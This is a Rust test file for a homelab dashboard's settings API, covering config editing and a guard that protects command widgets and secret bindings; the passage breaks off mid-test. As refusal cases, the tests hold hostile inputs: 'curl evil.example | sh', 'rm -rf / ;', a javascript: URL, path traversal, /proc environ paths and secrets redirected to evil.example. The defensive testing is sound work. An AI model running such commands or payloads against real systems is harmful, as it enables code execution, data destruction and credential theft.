//! Settings tests (DESIGN.md section 8). The fixture is a copy of the real
//! deployed config (comments, a command widget, two alert rules).

use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::{HeaderMap, Method, StatusCode};
use serde_json::{json, Value as J};
use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

use super::store::{self, Current};
use super::{api, diff, doc, guard, ops};
use crate::state::AppState;

const FIXTURE: &str = include_str!("fixtures/config.toml");

// ------------------------------------------------------------ helpers

fn tmp_dir() -> PathBuf {
    static N: AtomicU64 = AtomicU64::new(0);
    let d = std::env::temp_dir().join(format!(
        "rh-settings-{}-{}",
        std::process::id(),
        N.fetch_add(1, Ordering::Relaxed)
    ));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn state_with(text: Option<&str>) -> (PathBuf, Arc<AppState>) {
    let dir = tmp_dir();
    if let Some(t) = text {
        std::fs::write(dir.join("config.toml"), t).unwrap();
    }
    let env = crate::state::Env {
        listen: vec![],
        data_dir: dir.clone(),
        config_path: dir.join("config.toml"),
        docker_socket: String::new(),
        host_proc: "/nonexistent-proc".into(),
        host_sys: "/nonexistent-sys".into(),
        hostname: "testhost".into(),
        allowed_hosts: vec![],
    };
    (dir, AppState::new(env))
}

fn cur(text: &str) -> Current {
    Current {
        text: text.to_string(),
        hash: doc::sha256_hex(text.as_bytes()),
        exists: true,
    }
}

fn hash(text: &str) -> String {
    doc::sha256_hex(text.as_bytes())
}

fn file(dir: &std::path::Path) -> String {
    std::fs::read_to_string(dir.join("config.toml")).unwrap_or_default()
}

async fn call(st: &Arc<AppState>, method: Method, path: &str, body: Option<J>) -> (StatusCode, J) {
    let segs = path
        .split('/')
        .filter(|s| !s.is_empty())
        .map(String::from)
        .collect();
    let mut headers = HeaderMap::new();
    if path == "security/password" {
        let token = "ab".repeat(32);
        let now = crate::auth::now_s();
        let hash = crate::auth::sha256_hex(token.as_bytes());
        if st.db.account_session(&hash, now, now).is_none() {
            assert!(st.db.create_session(&hash, now, now + 60));
        }
        headers.insert(
            hyper::header::COOKIE,
            format!("rh_session={token}").parse().unwrap(),
        );
    }
    let resp = api::handle(
        st,
        api::Call {
            method,
            segs,
            headers,
            body: body
                .map(|b| Bytes::from(serde_json::to_vec(&b).unwrap()))
                .unwrap_or_default(),
            user: "admin".into(),
        },
    )
    .await;
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    (status, serde_json::from_slice(&bytes).unwrap_or(J::Null))
}

async fn post(st: &Arc<AppState>, path: &str, body: J) -> (StatusCode, J) {
    call(st, Method::POST, path, Some(body)).await
}

async fn get(st: &Arc<AppState>, path: &str) -> (StatusCode, J) {
    call(st, Method::GET, path, None).await
}

fn comments(text: &str) -> Vec<&str> {
    text.lines()
        .filter(|l| l.trim_start().starts_with('#'))
        .collect()
}

/// (added, removed) line counts between two texts.
fn changes(a: &str, b: &str) -> (usize, usize) {
    let v = diff::hunks_json(a, b);
    (
        v["added"].as_u64().unwrap() as usize,
        v["removed"].as_u64().unwrap() as usize,
    )
}

fn parse_ok(text: &str) -> crate::config::Config {
    crate::config::parse(text, "t.toml").unwrap_or_else(|e| panic!("{e}\n---\n{text}"))
}

fn widget_ids(text: &str) -> Vec<String> {
    parse_ok(text)
        .widgets
        .iter()
        .map(|w| w.id.clone())
        .collect()
}

fn list_req(action: &str, id: Option<J>, item: Option<J>, order: Option<J>) -> ops::CollectionReq {
    let mut v = json!({"base_hash": "x", "action": action});
    if let Some(i) = id {
        v["id"] = i;
    }
    if let Some(i) = item {
        v["item"] = i;
    }
    if let Some(o) = order {
        v["order"] = o;
    }
    serde_json::from_value(v).unwrap()
}

fn mailpit2() -> J {
    json!({
        "id": "mailpit2", "type": "custom-api", "title": "Mailpit 2",
        "url": "http://100.64.0.10:8025/api/v1/info", "refresh": "60s",
        "fields": {"unread": "Unread", "messages": "Messages", "size": "DatabaseSize", "version": "Version"},
        "rows": [{"label": "Unread", "value": "{{unread | number}}"}, {"label": "DB", "value": "{{size | bytes}}"}],
        "status": {"field": "_status", "ok": [200]},
    })
}

// ------------------------------------------------------------ engine

#[test]
fn fixture_round_trips_and_is_valid() {
    let d = doc::parse(FIXTURE).unwrap();
    assert_eq!(d.to_string(), FIXTURE);
    parse_ok(FIXTURE);
}

#[test]
fn hash_is_sha256_hex() {
    assert_eq!(
        hash(""),
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    );
}

#[test]
fn general_edit_changes_one_line_and_keeps_comments() {
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"title": "home"}})).unwrap();
    let d = ops::general(&cur(FIXTURE), &req).unwrap();
    assert_eq!(changes(FIXTURE, &d.text), (1, 1), "{}", d.text);
    assert!(d.text.contains("title = \"home\""));
    assert_eq!(comments(FIXTURE), comments(&d.text));
    assert_eq!(d.note, "general");
    assert_eq!(parse_ok(&d.text).page.title.as_deref(), Some("home"));

    // Adding a key adds one line; null removes it again.
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"columns": 3, "layout": "list"}}))
            .unwrap();
    let d2 = ops::general(&cur(&d.text), &req).unwrap();
    assert_eq!(changes(&d.text, &d2.text), (2, 0));
    let req: ops::PatchReq = serde_json::from_value(
        json!({"base_hash": "x", "page": {"columns": null, "layout": null}}),
    )
    .unwrap();
    let d3 = ops::general(&cur(&d2.text), &req).unwrap();
    assert_eq!(d3.text, d.text);
}

#[test]
fn unchanged_value_keeps_its_formatting_and_trailing_comment() {
    let text = "[page]\ntitle = 'homelab'   # my box\ncolumns = 4 # four\n";
    let req: ops::PatchReq = serde_json::from_value(
        json!({"base_hash": "x", "page": {"title": "homelab", "columns": 5}}),
    )
    .unwrap();
    let d = ops::general(&cur(text), &req).unwrap();
    assert_eq!(
        d.text,
        "[page]\ntitle = 'homelab'   # my box\ncolumns = 5 # four\n"
    );
}

#[test]
fn shapes_reject_unknown_fields_and_bad_types() {
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"titel": "x"}})).unwrap();
    let e = ops::general(&cur(FIXTURE), &req).unwrap_err();
    assert_eq!(e.status, StatusCode::BAD_REQUEST);
    // A bad value is a 422 on its field, in plain words (SET-07).
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"theme": "pink"}})).unwrap();
    let e = ops::general(&cur(FIXTURE), &req).unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(e.body["field"], "theme");
    assert_eq!(e.body["error"], "Choose one of the offered options.");
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"columns": 2.5}})).unwrap();
    let e = ops::general(&cur(FIXTURE), &req).unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(e.body["field"], "columns");
    assert_eq!(e.body["error"], "Use a whole number.");
    assert!(
        serde_json::from_value::<ops::PatchReq>(json!({"base_hash": "x", "page": {}, "x": 1}))
            .is_err()
    );
}

#[test]
fn widget_add_writes_tables_after_the_last_widget() {
    let req = list_req("add", None, Some(mailpit2()), None);
    let d = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap();
    let (added, removed) = changes(FIXTURE, &d.text);
    assert_eq!(removed, 0, "{}", d.text);
    assert!(added > 5);
    assert_eq!(comments(FIXTURE), comments(&d.text));
    assert_eq!(
        widget_ids(&d.text),
        [
            "beszel",
            "mailpit",
            "odoo20",
            "procs",
            "broken-demo",
            "mailpit2"
        ]
    );
    // Placed before the notifications section, as sub-tables.
    let w = d.text.find("id = \"mailpit2\"").unwrap();
    assert!(w < d.text.find("# ---- Notifications").unwrap());
    assert!(w > d.text.find("id = \"broken-demo\"").unwrap());
    assert!(d.text[w..].contains("[widgets.fields]"));
    assert!(d.text[w..].contains("[[widgets.rows]]"));
    assert_eq!(d.note, "widgets: added mailpit2");
    // Adding an existing id is refused.
    let req = list_req(
        "add",
        None,
        Some(json!({"id": "beszel", "type": "custom-api", "url": "http://x/"})),
        None,
    );
    let e = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
}

#[test]
fn widget_edit_patches_in_place() {
    // What GET /widgets returns for it, edited like the form would.
    let d0 = doc::parse(FIXTURE).unwrap();
    let t = d0["widgets"].as_array_of_tables().unwrap().get(4).unwrap();
    let mut item = doc::table_json(t);
    item["title"] = json!("Broken (still)");
    item["fields"]["y"] = json!("y");
    let req = list_req("edit", Some(json!("broken-demo")), Some(item), None);
    let d = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap();
    assert_eq!(changes(FIXTURE, &d.text), (2, 1), "{}", d.text);
    assert!(d
        .text
        .contains("# Deliberately broken (nothing listens on :9) to show one failing widget"));
    assert_eq!(d.note, "widgets: edited broken-demo");
    parse_ok(&d.text);
}

#[test]
fn widget_reorder_moves_entries_with_their_comments() {
    let order = json!(["broken-demo", "beszel", "mailpit", "odoo20", "procs"]);
    let req = list_req("reorder", None, None, Some(order));
    let d = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap();
    assert_eq!(
        widget_ids(&d.text),
        ["broken-demo", "beszel", "mailpit", "odoo20", "procs"]
    );
    let mut a: Vec<&str> = FIXTURE.lines().filter(|l| !l.trim().is_empty()).collect();
    let mut b: Vec<&str> = d.text.lines().filter(|l| !l.trim().is_empty()).collect();
    a.sort();
    b.sort();
    assert_eq!(a, b, "reorder must not lose or add lines:\n{}", d.text);
    // Entry comment stays with its entry; nothing else moved.
    let c = d.text.find("# Deliberately broken").unwrap();
    assert!(c < d.text.find("id = \"broken-demo\"").unwrap());
    assert!(d.text.find("id = \"procs\"").unwrap() < d.text.find("# ---- Notifications").unwrap());
    assert!(d.text.find("[icons]").unwrap() < d.text.find("[[widgets]]").unwrap());
    assert_eq!(d.note, "widgets: reordered");
    // Not a permutation.
    let bad = list_req("reorder", None, None, Some(json!(["beszel"])));
    assert!(ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &bad).is_err());
}

#[test]
fn deleting_the_first_widget_keeps_the_section_comment() {
    let req = list_req("delete", Some(json!("beszel")), None, None);
    let d = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap();
    assert_eq!(
        widget_ids(&d.text),
        ["mailpit", "odoo20", "procs", "broken-demo"]
    );
    let h = d.text.find("# ---- Custom widgets (M3)").unwrap();
    assert!(h < d.text.find("id = \"mailpit\"").unwrap());
    assert_eq!(comments(FIXTURE), comments(&d.text));
    assert_eq!(d.note, "widgets: deleted beszel");
}

#[test]
fn bookmarks_add_edit_reorder_delete() {
    let add = |text: &str, name: &str| {
        let req = list_req(
            "add",
            None,
            Some(json!({"name": name, "url": format!("https://{name}.example"), "group": "Links"})),
            None,
        );
        ops::list_action(&cur(text), &ops::BOOKMARKS, &req)
            .unwrap()
            .text
    };
    let t1 = add(FIXTURE, "github");
    let t2 = add(&t1, "gitea");
    assert_eq!(changes(FIXTURE, &t2).1, 0);
    let c = parse_ok(&t2);
    assert_eq!(c.bookmarks.len(), 2);
    let req = list_req("reorder", None, None, Some(json!([1, 0])));
    let d = ops::list_action(&cur(&t2), &ops::BOOKMARKS, &req).unwrap();
    assert_eq!(parse_ok(&d.text).bookmarks[0].name, "gitea");
    assert_eq!(d.note, "bookmarks: reordered");
    let req = list_req(
        "edit",
        Some(json!(0)),
        Some(json!({"name": "Gitea", "url": "https://git.example"})),
        None,
    );
    let d = ops::list_action(&cur(&d.text), &ops::BOOKMARKS, &req).unwrap();
    let c = parse_ok(&d.text);
    assert_eq!(c.bookmarks[0].name, "Gitea");
    assert!(
        c.bookmarks[0].group.is_some(),
        "an edit keeps a field it does not send"
    );
    assert_eq!(d.note, "bookmarks: renamed gitea to Gitea");
    let req = list_req(
        "edit",
        Some(json!(0)),
        Some(json!({"name": "Gitea", "url": "https://git.example", "group": null})),
        None,
    );
    let d = ops::list_action(&cur(&d.text), &ops::BOOKMARKS, &req).unwrap();
    assert_eq!(
        parse_ok(&d.text).bookmarks[0].group,
        None,
        "null removes it"
    );
    let mut t = d.text;
    for _ in 0..2 {
        let req = list_req("delete", Some(json!(0)), None, None);
        t = ops::list_action(&cur(&t), &ops::BOOKMARKS, &req)
            .unwrap()
            .text;
    }
    assert_eq!(t, FIXTURE, "adding and deleting restores the file");
    // Missing url: "Required." on the field.
    let req = list_req("add", None, Some(json!({"name": "x"})), None);
    let e = ops::list_action(&cur(FIXTURE), &ops::BOOKMARKS, &req).unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(
        (&e.body["field"], &e.body["error"]),
        (&json!("url"), &json!("Required."))
    );
    // Only web links (SET-40), and a name.
    for url in [
        "not a url",
        "javascript:alert(1)",
        "ftp://x",
        "http://",
        "https:// x",
    ] {
        let req = list_req("add", None, Some(json!({"name": "x", "url": url})), None);
        let e = ops::list_action(&cur(FIXTURE), &ops::BOOKMARKS, &req).unwrap_err();
        assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY, "{url}");
        assert_eq!(e.body["field"], "url", "{url}");
    }
    let req = list_req(
        "add",
        None,
        Some(json!({"name": " ", "url": "https://x"})),
        None,
    );
    let e = ops::list_action(&cur(FIXTURE), &ops::BOOKMARKS, &req).unwrap_err();
    assert_eq!(e.body["field"], "name");
}

#[test]
fn container_overrides_quote_names_and_bulk_edit() {
    let req: ops::OverrideReq = serde_json::from_value(json!({
        "base_hash": "x", "names": ["web.1", "my-app_2", "dozzle"],
        "set": {"group": "apps", "icon": "docker"},
    }))
    .unwrap();
    let d = ops::container_override(&cur(FIXTURE), &req).unwrap();
    assert!(d.text.contains("[containers.\"web.1\"]"), "{}", d.text);
    assert!(d.text.contains("[containers.my-app_2]"));
    assert!(!d.text.contains("[containers]\n"), "no empty parent header");
    assert_eq!(changes(FIXTURE, &d.text).1, 0);
    let c = parse_ok(&d.text);
    assert_eq!(c.containers["web.1"].group.as_deref(), Some("apps"));
    assert_eq!(c.containers["dozzle"].icon.as_deref(), Some("docker"));
    assert_eq!(d.note, "containers: 3 overrides");

    let req: ops::OverrideReq = serde_json::from_value(json!({
        "base_hash": "x", "names": ["web.1"], "set": {"hide": true}, "clear": ["icon"],
    }))
    .unwrap();
    let d2 = ops::container_override(&cur(&d.text), &req).unwrap();
    let c = parse_ok(&d2.text);
    assert_eq!(c.containers["web.1"].hide, Some(true));
    assert_eq!(c.containers["web.1"].icon, None);
    assert_eq!(d2.note, "containers: web.1");

    // Clearing every key removes the table; removing all restores the file.
    let req: ops::OverrideReq = serde_json::from_value(json!({
        "base_hash": "x", "names": ["web.1", "my-app_2", "dozzle"], "remove": true,
    }))
    .unwrap();
    assert_eq!(
        ops::container_override(&cur(&d2.text), &req).unwrap().text,
        FIXTURE
    );

    for bad in ["", "a b", "../x", "-x", "x\"]"] {
        let req: ops::OverrideReq = serde_json::from_value(
            json!({"base_hash": "x", "names": [bad], "set": {"hide": true}}),
        )
        .unwrap();
        assert!(
            ops::container_override(&cur(FIXTURE), &req).is_err(),
            "{bad:?}"
        );
    }
    let req: ops::OverrideReq =
        serde_json::from_value(json!({"base_hash": "x", "names": ["a"], "set": {"size": "huge"}}))
            .unwrap();
    assert!(ops::container_override(&cur(FIXTURE), &req).is_err());
}

#[test]
fn system_toggle() {
    let req: ops::SystemReq =
        serde_json::from_value(json!({"base_hash": "x", "enabled": false})).unwrap();
    let d = ops::system(&cur(FIXTURE), &req).unwrap();
    assert!(!parse_ok(&d.text).system.enabled);
    assert_eq!(d.note, "widgets: system tiles off");
}

#[test]
fn history_section_is_patched_generically() {
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "history": {"sample_interval": "30s"}}))
            .unwrap();
    let d = ops::history(&cur(FIXTURE), &req).unwrap();
    assert!(
        d.text.ends_with("[history]\nsample_interval = \"30s\"\n"),
        "{}",
        d.text
    );
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "history": {"Bad-Key": 1}})).unwrap();
    assert!(ops::history(&cur(FIXTURE), &req).is_err());
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "history": {"x": [1]}})).unwrap();
    assert!(ops::history(&cur(FIXTURE), &req).is_err());
}

#[test]
fn channels_take_env_names_never_values() {
    let add = |text: &str, item: J| {
        let req = list_req("add", None, Some(item), None);
        ops::channel_action(&cur(text), &req)
    };
    let d = add(
        FIXTURE,
        json!({"name": "slack", "type": "slack", "webhook_url_env": "RH_SLACK_WEBHOOK_URL"}),
    )
    .unwrap();
    assert!(d.text.contains("[channels.slack]"));
    assert!(d.warnings.is_empty());
    assert_eq!(d.note, "notifications: added channel slack");
    let c = parse_ok(&d.text);
    assert_eq!(
        c.channels["slack"].webhook_url_env.as_deref(),
        Some("RH_SLACK_WEBHOOK_URL")
    );
    // The commented examples above [[alerts]] are untouched.
    assert_eq!(comments(FIXTURE), comments(&d.text));

    // A secret value in an *_env field is refused.
    let e = add(
        FIXTURE,
        json!({"name": "s2", "type": "slack", "webhook_url_env": "https://hooks.slack.com/services/T0/B0/abc"}),
    )
    .unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(e.body["field"], "webhook_url_env");
    assert!(!e.body.to_string().contains("hooks.slack.com"));
    let e = add(
        FIXTURE,
        json!({"name": "t", "type": "telegram", "token_env": "lower_case", "chat_id": 1}),
    )
    .unwrap_err();
    assert_eq!(e.body["field"], "token_env");
    // A file path outside {data_dir}/secrets passes the form's format check
    // but is refused by the guard that every commit runs.
    let dp = add(
        FIXTURE,
        json!({"name": "t", "type": "telegram", "token_file": "/proc/self/environ", "chat_id": 1}),
    )
    .unwrap();
    assert!(guard::check(FIXTURE, &dp.text, sec()).is_err());
    let e = add(
        FIXTURE,
        json!({"name": "t", "type": "telegram", "token_file": "../etc/x", "chat_id": 1}),
    )
    .unwrap_err();
    assert_eq!(e.body["field"], "token_file");
    // Unknown field (a secret by another name) is refused.
    assert!(add(
        FIXTURE,
        json!({"name": "t", "type": "telegram", "token": "123:abc"})
    )
    .is_err());

    // Plain webhook url: allowed, with a warning.
    let d2 = add(
        &d.text,
        json!({"name": "hook", "type": "webhook", "url": "http://100.64.0.10:8080/hook"}),
    )
    .unwrap();
    assert_eq!(d2.warnings.len(), 1);

    // Rename keeps rules pointing at it.
    let with_rule = d.text.replace(
        "channels = []                    # e.g.",
        "channels = [\"slack\"]                    # e.g.",
    );
    parse_ok(&with_rule);
    let req = list_req(
        "edit",
        Some(json!("slack")),
        Some(json!({"name": "team", "type": "slack", "webhook_url_env": "RH_SLACK_WEBHOOK_URL"})),
        None,
    );
    let d3 = ops::channel_action(&cur(&with_rule), &req).unwrap();
    let c = parse_ok(&d3.text);
    assert!(c.channels.contains_key("team"));
    assert_eq!(c.alerts[0].channels, ["team"]);
    assert!(d3
        .text
        .contains("channels = [\"team\"]                    # e.g."));
    assert_eq!(d3.note, "notifications: renamed channel slack to team");

    // Delete the last channel: back to the original file.
    let req = list_req("delete", Some(json!("slack")), None, None);
    assert_eq!(
        ops::channel_action(&cur(&d.text), &req).unwrap().text,
        FIXTURE
    );
}

#[test]
fn alert_rules_add_edit_delete() {
    let rule = json!({
        "name": "odoo-up", "type": "http", "url": "http://100.64.0.10:8070/web/health",
        "interval": "60s", "timeout": "5s", "expect_status": 200, "failures": 2,
        "channels": [], "cooldown": "15m", "for": "1m",
    });
    let req = list_req("add", None, Some(rule.clone()), None);
    let d = ops::list_action(&cur(FIXTURE), &ops::ALERTS, &req).unwrap();
    let c = parse_ok(&d.text);
    assert_eq!(c.alerts.len(), 3);
    assert_eq!(c.alerts[2].failures, Some(2));
    assert_eq!(d.note, "alerts: added odoo-up");
    let mut edited = rule.clone();
    edited["failures"] = json!(3);
    let req = list_req("edit", Some(json!("odoo-up")), Some(edited), None);
    let d2 = ops::list_action(&cur(&d.text), &ops::ALERTS, &req).unwrap();
    assert_eq!(changes(&d.text, &d2.text), (1, 1));
    let req = list_req("delete", Some(json!("odoo-up")), None, None);
    assert_eq!(
        ops::list_action(&cur(&d2.text), &ops::ALERTS, &req)
            .unwrap()
            .text,
        FIXTURE
    );
    let mut bad = rule;
    bad["severity"] = json!("high");
    let req = list_req("add", None, Some(bad), None);
    assert!(ops::list_action(&cur(FIXTURE), &ops::ALERTS, &req).is_err());
}

// ------------------------------------------------------------ guard

const CMD: &str = r#"
[[widgets]]
id = "procs"
type = "command"
enabled = true
command = ["sh", "-c", "echo 1"]
"#;

fn guard_err(old: &str, new: &str) -> String {
    guard::check(old, new, sec()).unwrap_err().0
}

#[test]
fn guard_matrix() {
    // Raw add.
    assert!(guard_err("", CMD).contains("adds"));
    // Modify any key.
    for (a, b) in [
        ("echo 1", "echo 2"),
        ("enabled = true", "enabled = true\ntimeout = \"9s\""),
        ("id = \"procs\"", "id = \"procs\"\ntitle = \"x\""),
        ("enabled = true", "enabled = true\nenv = { A = \"b\" }"),
    ] {
        assert!(
            guard_err(CMD, &CMD.replace(a, b)).contains("changes"),
            "{b}"
        );
    }
    // Enable.
    let off = CMD.replace("enabled = true", "enabled = false");
    assert!(guard_err(&off, CMD).contains("enables"));
    let unset = CMD.replace("enabled = true\n", "");
    assert!(guard_err(&unset, CMD).contains("enables"));
    // Rename the id: a new command widget.
    assert!(guard_err(CMD, &CMD.replace("\"procs\"", "\"procs2\"")).contains("adds"));
    // custom-api -> command.
    let api = "[[widgets]]\nid = \"procs\"\ntype = \"custom-api\"\nurl = \"http://x/\"\n";
    assert!(guard_err(api, CMD).contains("turns into"));
    // A custom-api widget that gains a command key, or an unknown type.
    let gains = api.replace("url =", "command = [\"sh\"]\nurl =");
    assert!(guard::check(api, &gains, sec()).is_err());
    assert!(guard::check(api, &api.replace("custom-api", "Command"), sec()).is_err());
    // Inline-array form is caught too.
    let inline = "widgets = [{ id = \"x\", type = \"command\", command = [\"sh\"] }]\n";
    assert!(guard::check("", inline, sec()).is_err());
    // Restore of an old revision with a different command widget.
    let old_rev = CMD.replace("echo 1", "curl evil.example | sh");
    assert!(guard::check(CMD, &old_rev, sec()).is_err());
    // An unparsable old file counts as having no command widgets.
    assert!(guard::check("[[widgets", CMD, sec()).is_err());

    // Allowed: unchanged through an unrelated edit, reformatted, deleted,
    // turned into a harmless custom-api widget.
    let other = format!("[page]\ntitle = \"x\"\n{CMD}");
    assert!(guard::check(CMD, &other, sec()).is_ok());
    let reformatted = CMD.replace("[\"sh\", \"-c\", \"echo 1\"]", "[ 'sh', '-c', 'echo 1' ]");
    assert!(guard::check(CMD, &reformatted, sec()).is_ok());
    assert!(guard::check(CMD, "", sec()).is_ok());
    assert!(guard::check(CMD, api, sec()).is_ok());
    assert!(guard::check(FIXTURE, FIXTURE, sec()).is_ok());
}

fn sec() -> &'static std::path::Path {
    std::path::Path::new("/data/secrets")
}

#[test]
fn guard_secret_files_are_allowlisted_to_data_secrets() {
    let w = |p: &str| {
        format!("[[widgets]]\nid = \"a\"\ntype = \"custom-api\"\nurl = \"http://x/\"\nheaders_file = {{ X = \"{p}\" }}\n")
    };
    // Denylist bypasses from the security review, and other places.
    for bad in [
        "/proc/1/environ",
        "/host/proc/self/environ",
        "/host/proc/1/environ",
        "/host/sys/kernel/x",
        "/data/hobnail.db",
        "/data/secrets/../hobnail.db",
        "/data/secretsX/t",
        "/run/secrets/tg",
        "relative/path",
    ] {
        assert!(
            guard::check("", &w(bad), sec()).is_err(),
            "{bad} must be refused"
        );
    }
    // Already in the file (set on the host): left alone.
    assert!(guard::check(&w("/run/secrets/tg"), &w("/run/secrets/tg"), sec()).is_ok());
    // The secrets dir is fine (binding check aside: use a channel, unbound).
    let c = "[channels.t]\ntype = \"telegram\"\ntoken_file = \"/data/secrets/tg\"\nchat_id = 1\n";
    assert!(guard::check("", c, sec()).is_ok());
    assert!(guard::check("", &c.replace("/data/secrets/tg", "/run/secrets/tg"), sec()).is_err());
}

#[test]
fn guard_secret_location_resolves_symlinks() {
    let dir = std::env::temp_dir().join(format!("rh-sec-{}", std::process::id()));
    let sec = dir.join("secrets");
    std::fs::create_dir_all(&sec).unwrap();
    std::fs::write(dir.join("outside"), "x").unwrap();
    let link = sec.join("link");
    let _ = std::fs::remove_file(&link);
    std::os::unix::fs::symlink(dir.join("outside"), &link).unwrap();
    let p = link.to_string_lossy().to_string();
    assert!(
        guard::check_secret_location(&p, &sec).is_err(),
        "symlink out of the dir"
    );
    std::fs::write(sec.join("real"), "x").unwrap();
    assert!(guard::check_secret_location(&sec.join("real").to_string_lossy(), &sec).is_ok());
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn guard_binds_secrets_to_their_destination() {
    let w = |url: &str, env: &str| {
        format!("[[widgets]]\nid = \"a\"\ntype = \"custom-api\"\ntitle = \"T\"\nurl = \"{url}\"\nheaders_env = {{ Authorization = \"{env}\" }}\n")
    };
    let base = w("http://svc/api", "SVC_TOKEN");
    // Adding a header secret from the app: refused.
    assert!(guard::check("", &base, sec()).is_err());
    // Steering an existing secret to another host: refused.
    assert!(guard::check(&base, &w("http://evil.example/", "SVC_TOKEN"), sec()).is_err());
    // Attaching a different (more valuable) secret to the same URL: refused.
    assert!(guard::check(&base, &w("http://svc/api", "RH_TELEGRAM_TOKEN"), sec()).is_err());
    // Unrelated edits to the bound widget: allowed.
    assert!(guard::check(
        &base,
        &base.replace("title = \"T\"", "title = \"New\""),
        sec()
    )
    .is_ok());
    // Dropping the secret: allowed.
    let plain = "[[widgets]]\nid = \"a\"\ntype = \"custom-api\"\nurl = \"http://evil.example/\"\n";
    assert!(guard::check(&base, plain, sec()).is_ok());

    // Telegram: default api_base is fixed (allowed); a custom api_base is bound.
    let tg = "[channels.tg]\ntype = \"telegram\"\ntoken_env = \"RH_TELEGRAM_TOKEN\"\nchat_id = 1\n";
    assert!(guard::check("", tg, sec()).is_ok());
    let tg_evil = tg.replace(
        "chat_id = 1",
        "chat_id = 1\napi_base = \"http://evil.example\"",
    );
    assert!(guard::check(tg, &tg_evil, sec()).is_err());
    assert!(
        guard::check(&tg_evil, &tg_evil, sec()).is_ok(),
        "set on the host: kept"
    );
    let tg_moved = tg_evil.replace("evil.example", "other.example");
    assert!(guard::check(&tg_evil, &tg_moved, sec()).is_err());

    // Webhook with a secret header: bound; without one: free.
    let wh = "[channels.w]\ntype = \"webhook\"\nurl = \"http://hook/\"\nheaders_env = { Authorization = \"HOOK_AUTH\" }\n";
    assert!(guard::check("", wh, sec()).is_err());
    assert!(guard::check(wh, &wh.replace("http://hook/", "http://evil/"), sec()).is_err());
    assert!(guard::check(
        "",
        "[channels.w]\ntype = \"webhook\"\nurl = \"http://hook/\"\n",
        sec()
    )
    .is_ok());
    // Slack: the secret is the destination, nothing to steer.
    let sl = "[channels.s]\ntype = \"slack\"\nwebhook_url_env = \"RH_SLACK_WEBHOOK_URL\"\n";
    assert!(guard::check("", sl, sec()).is_ok());
}

#[tokio::test]
async fn form_api_never_touches_command_widgets() {
    let (dir, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    let cases = [
        json!({"base_hash": h, "action": "add", "item": {"id": "x", "type": "command", "command": ["sh"]}}),
        json!({"base_hash": h, "action": "add", "item": {"id": "x", "type": "command"}}),
        json!({"base_hash": h, "action": "add", "item": {"id": "x", "type": "custom-api", "url": "http://x/", "env": {}}}),
        json!({"base_hash": h, "action": "add", "item": {"id": "procs", "type": "custom-api", "url": "http://x/"}}),
        json!({"base_hash": h, "action": "edit", "id": "procs", "item": {"id": "procs", "type": "custom-api", "url": "http://x/"}}),
        json!({"base_hash": h, "action": "edit", "id": "beszel", "item": {"id": "procs", "type": "custom-api", "url": "http://x/"}}),
        json!({"base_hash": h, "action": "delete", "id": "procs"}),
    ];
    for c in cases {
        let (s, b) = post(&st, "widgets", c.clone()).await;
        assert_eq!(s, StatusCode::FORBIDDEN, "{c} -> {b}");
        assert_eq!(b["locked"], true);
        assert_eq!(file(&dir), FIXTURE);
    }
    let (s, _) = post(
        &st,
        "widgets/preview",
        json!({"item": {"id": "x", "type": "command", "command": ["id"]}}),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN);
    // Reordering around the locked widget is fine (it stays identical).
    let (s, b) = post(
        &st,
        "widgets",
        json!({"base_hash": h, "action": "reorder",
        "order": ["procs", "beszel", "mailpit", "odoo20", "broken-demo"]}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(widget_ids(&file(&dir))[0], "procs");
}

#[tokio::test]
async fn raw_editor_guard_and_allowed_cases() {
    let (dir, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    let refused = [
        FIXTURE.replace("refresh = \"15s\"", "refresh = \"20s\""),
        FIXTURE.replace("id = \"procs\"", "id = \"procs2\""),
        FIXTURE.replace("printf", "rm -rf / ; printf"),
        format!("{FIXTURE}\n[[widgets]]\nid = \"x\"\ntype = \"command\"\nenabled = true\ncommand = [\"id\"]\n"),
        FIXTURE.replace("id = \"beszel\"\ntype = \"custom-api\"", "id = \"beszel\"\ntype = \"command\"\ncommand = [\"id\"]"),
    ];
    for t in &refused {
        let (s, b) = post(&st, "config", json!({"base_hash": h, "text": t})).await;
        assert!(
            s == StatusCode::FORBIDDEN || s == StatusCode::UNPROCESSABLE_ENTITY,
            "{s} {b}"
        );
        assert_eq!(file(&dir), FIXTURE, "refused text must never be written");
    }
    // Enabling a disabled command widget.
    let off = FIXTURE.replace("enabled = true", "enabled = false");
    let (dir2, st2) = state_with(Some(&off));
    let (s, b) = post(
